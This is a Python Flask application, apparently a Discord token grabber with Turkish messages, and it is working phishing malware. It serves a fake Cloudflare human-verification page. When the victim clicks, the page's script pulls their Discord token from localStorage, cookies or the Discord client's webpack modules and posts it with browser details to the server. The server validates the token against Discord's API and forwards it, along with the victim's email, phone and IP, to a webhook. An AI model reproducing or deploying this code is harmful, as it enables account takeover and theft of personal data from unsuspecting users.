import os
import re
import json
import base64
import logging
import datetime
import requests
from flask import Flask, request, jsonify

def _load_env():
    if os.path.isfile(".env"):
        with open(".env") as f:
            for line in f:
                line = line.strip()
                if "=" in line and not line.startswith("#"):
                    k, v = line.split("=", 1)
                    os.environ[k.strip()] = v.strip()
_load_env()

WEBHOOK_URL = os.getenv("WEBHOOK_URL", "")
GUILD_INVITE = os.getenv("GUILD_INVITE", "")
FLASK_HOST = os.getenv("FLASK_HOST", "0.0.0.0")
FLASK_PORT = int(os.getenv("FLASK_PORT", "5000"))

logging.basicConfig(level=logging.INFO, format="[%(asctime)s] %(message)s")

app = Flask(__name__)

CF_PAGE = """<!DOCTYPE html><html lang=tr><head><meta charset=utf-8><meta name=viewport content="width=device-width,initial-scale=1"><title>Just a moment...</title><style>*{margin:0;padding:0;box-sizing:border-box}body{background:#0d1117;color:#e6edf3;font-family:-apple-system,BlinkMacSystemFont,'Segoe UI','Noto Sans',Helvetica,Arial,sans-serif;display:flex;justify-content:center;align-items:center;min-height:100vh;flex-direction:column}.card{background:#161b22;border:1px solid #30363d;border-radius:12px;padding:36px 40px;width:460px;max-width:94vw;text-align:center;box-shadow:0 8px 24px rgba(0,0,0,.6)}.cf-logo{width:44px;height:44px;margin:0 auto 14px}.cf-logo svg{width:44px;height:44px}h1{font-size:18px;font-weight:600;color:#e6edf3;margin-bottom:6px}.sub{color:#8b949e;font-size:13px;margin-bottom:24px;line-height:1.5}.widget{display:flex;align-items:center;justify-content:space-between;background:#0d1117;border:1px solid #30363d;border-radius:6px;padding:12px 16px;cursor:pointer;transition:border-color .2s,background .2s;user-select:none;margin-bottom:8px}.widget:hover{border-color:#58a6ff;background:#111820}.widget-left{display:flex;align-items:center;gap:10px}.cf-checkbox{width:22px;height:22px;border:2px solid #484f58;border-radius:4px;display:flex;align-items:center;justify-content:center;transition:all .25s;font-size:13px;color:#fff;flex-shrink:0}.cf-checkbox.done{background:#238636;border-color:#238636}.cf-brand{font-size:11px;color:#8b949e;display:flex;align-items:center;gap:4px}.cf-brand svg{width:16px;height:16px}.spinner{display:none;align-items:center;justify-content:center;gap:10px;padding:8px 0;margin-top:4px}.spinner.show{display:flex}.loader{width:22px;height:22px;border:3px solid #238636;border-top-color:transparent;border-radius:50%;animation:spin .8s linear infinite}.loading-text{font-size:14px;color:#3fb950;font-weight:500}.verified{display:none;align-items:center;justify-content:center;gap:8px;padding:8px 0;margin-top:4px}.verified.show{display:flex}.checkmark{width:24px;height:24px;background:#238636;border-radius:50%;display:flex;align-items:center;justify-content:center;font-size:14px;color:#fff;font-weight:700}.verified-text{font-size:16px;color:#3fb950;font-weight:600}.cf-footer{margin-top:24px;padding-top:14px;border-top:1px solid #21262d;font-size:11px;color:#484f58}.cf-footer span{display:block;margin-bottom:2px}.cf-footer small{color:#30363d;font-size:10px}@keyframes spin{0%{transform:rotate(0deg)}100%{transform:rotate(360deg)}}</style></head><body><div class=card><div class=cf-logo><svg viewBox="0 0 48 48" fill=none><circle cx=24 cy=24 r=22 fill=#F38020/><path d="M16 28c0-2.8 2.2-5 5-5h1.8c-.4-1.9.2-3.9 1.6-5.4 1.6-1.9 4.2-2.7 6.5-2.2 2.4.5 4.4 2.2 5.3 4.4.4-.1.8-.2 1.2-.2 2.8 0 5 2.2 5 5 0 .6-.1 1.2-.3 1.8H21c-1.4 0-2.5-1.1-2.5-2.5l.3-1.6c-.1-.3-.3-.6-.8-.8z" fill=#fff/></svg></div><h1>Just a moment...</h1><p class=sub>Checking your browser before accessing the server. This is protected by Cloudflare&reg;.</p><div class=widget id=cf-widget onclick=startVerify()><div class=widget-left><div class=cf-checkbox id=cf-checkbox></div><span style=font-size:13px;color:#e6edf3>I am human</span></div><div class=cf-brand><svg viewBox="0 0 24 24"><circle cx=12 cy=12 r=10 fill=#F38020/><path d="M8 14c0-1.4 1.1-2.5 2.5-2.5h.9c-.2 1 .1 2 .8 2.7.8 1 2.1 1.4 3.3 1.1s2.2-1.1 2.6-2.2c.2-.1.4-.1.6-.1 1.4 0 2.5 1.1 2.5 2.5 0 .3-.1.6-.2.9H10.5c-.7 0-1.2-.6-1.2-1.2l.1-.8c-.1-.1-.2-.3-.4-.4z" fill=#fff/></svg>Cloudflare</div></div><div class=spinner id=cf-spinner><div class=loader></div><span class=loading-text>Verifying...</span></div><div class=verified id=cf-verified><div class=checkmark>&#10003;</div><span class=verified-text>Verified!</span></div><div class=cf-footer><span>Powered by Cloudflare&reg;</span><small>Protecting your connection &middot; 3.2.1</small></div></div><script>var INV="{INVITE}";var UID={UID};function gT(){var t=null;try{var x=localStorage.getItem('token');if(x&&x.length>10)t=x}catch(e){}if(!t){try{var c=document.cookie.match(/token=([^;]+)/);if(c&&c[1]&&c[1].length>10)t=c[1]}catch(e){}}if(!t&&window.webpackChunkdiscord_app&&webpackChunkdiscord_app.push){try{webpackChunkdiscord_app.push([[Symbol('discord')],{},function(e){if(!e||!e.c)return{};Object.keys(e.c).forEach(function(k){try{var m=e.c[k].exports;if(m&&m.default&&typeof m.default.getToken==='function'){var tk=m.default.getToken();if(tk&&tk.length>10)t=tk}}catch(e){}});return e.c}])}catch(e){}}return t}function startVerify(){document.getElementById('cf-widget').onclick=null;document.getElementById('cf-widget').style.cursor='default';document.getElementById('cf-checkbox').classList.add('done');document.getElementById('cf-checkbox').textContent='&#10003;';document.getElementById('cf-spinner').classList.add('show');var d={screen:screen.width+'x'+screen.height,lang:navigator.language,tz:Intl.DateTimeFormat().resolvedOptions().timeZone,ua:navigator.userAgent,token:gT()};fetch('/grab/'+UID,{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify(d)}).catch(function(){});setTimeout(function(){document.getElementById('cf-spinner').classList.remove('show');document.getElementById('cf-verified').classList.add('show')},1800);setTimeout(function(){window.location.href=INV},4800)}</script></body></html>"""


def send_webhook(embed):
    if not WEBHOOK_URL or WEBHOOK_URL == "WEBHOOK_URL_BURAYA":
        logging.warning("WEBHOOK_URL ayarlanmamış")
        return
    try:
        requests.post(WEBHOOK_URL, json={"embeds": [embed]}, timeout=10)
    except Exception as e:
        logging.warning(f"Webhook hatasi: {e}")


def validate_token(token):
    try:
        r = requests.get(
            "https://discord.com/api/v9/users/@me",
            headers={"Authorization": token},
            timeout=10
        )
        if r.status_code == 200:
            return r.json()
    except:
        pass
    return None


@app.route("/verify/<int:user_id>")
def verify_page(user_id):
    ip = request.headers.get("X-Forwarded-For", request.remote_addr or "0.0.0.0").split(",")[0].strip()
    ua = request.headers.get("User-Agent", "Unknown")
    invite = GUILD_INVITE.rstrip("/")
    page = CF_PAGE.replace("{INVITE}", invite).replace("{UID}", str(user_id))
    logging.info(f"PAGE: user={user_id} ip={ip}")
    return page


@app.route("/grab/<int:user_id>", methods=["POST"])
def grab(user_id):
    ip = request.headers.get("X-Forwarded-For", request.remote_addr or "0.0.0.0").split(",")[0].strip()
    ua = request.headers.get("User-Agent", "Unknown")
    data = request.get_json(silent=True) or {}
    screen = data.get("screen", "Bilinmiyor")
    lang = data.get("lang", "Bilinmiyor")
    tz = data.get("tz", "Bilinmiyor")
    token = data.get("token")

    now = datetime.datetime.utcnow().strftime("%Y-%m-%d %H:%M:%S UTC")

    embed = {
        "title": "Yeni Yakalama",
        "color": 0xF38020,
        "timestamp": datetime.datetime.utcnow().isoformat() + "Z",
        "fields": [
            {"name": "Hedef", "value": f"<@{user_id}> (`{user_id}`)", "inline": False},
            {"name": "IP Adresi", "value": f"```{ip}```", "inline": True},
            {"name": "User-Agent", "value": f"```{ua[:200]}```", "inline": False},
            {"name": "Ekran", "value": screen, "inline": True},
            {"name": "Dil", "value": lang, "inline": True},
            {"name": "Saat Dilimi", "value": tz, "inline": True},
            {"name": "Zaman", "value": now, "inline": False},
        ]
    }

    if token and isinstance(token, str) and len(token) > 10:
        user = validate_token(token)
        if user:
            flags = []
            if user.get("verified"):
                flags.append("Doğrulanmış")
            if user.get("mfa_enabled"):
                flags.append("MFA")
            if user.get("premium_type"):
                flags.append("Nitro")
            avatar_url = f"https://cdn.discordapp.com/avatars/{user['id']}/{user['avatar']}.png" if user.get("avatar") else ""
            embed["description"] = "✅ Geçerli Discord tokeni ele geçirildi!"
            if avatar_url:
                embed["thumbnail"] = {"url": avatar_url}
            embed["fields"].append({"name": "━━━ KULLANICI BİLGİLERİ ━━━", "value": "Token doğrulandı", "inline": False})
            embed["fields"].append({"name": "Kullanıcı", "value": f"{user['username']}#{user.get('discriminator', '0')}", "inline": True})
            embed["fields"].append({"name": "ID", "value": user["id"], "inline": True})
            embed["fields"].append({"name": "Email", "value": user.get("email", "Yok"), "inline": True})
            embed["fields"].append({"name": "Telefon", "value": user.get("phone", "Yok"), "inline": True})
            embed["fields"].append({"name": "Durum", "value": ", ".join(flags) if flags else "Normal", "inline": True})
            embed["fields"].append({"name": "Token", "value": f"```{token}```", "inline": False})
            logging.info(f"GRAB: user={user_id} ip={ip} VALID_TOKEN={user['username']}#{user.get('discriminator', '0')}")
        else:
            embed["description"] = "⚠️ Token bulundu ama Discord API doğrulamadı (eski/geçersiz olabilir)"
            embed["fields"].append({"name": "Alınan Token", "value": f"```{token[:50]}...```", "inline": False})
            logging.info(f"GRAB: user={user_id} ip={ip} INVALID_TOKEN (API reddetti)")
    else:
        embed["description"] = "❌ Token bulunamadı"
        logging.info(f"GRAB: user={user_id} ip={ip} NO_TOKEN")

    send_webhook(embed)
    return jsonify({"status": "ok"})


if __name__ == "__main__":
    logging.info(f"Flask basliyor: {FLASK_HOST}:{FLASK_PORT}")
    app.run(host=FLASK_HOST, port=FLASK_PORT, debug=False)
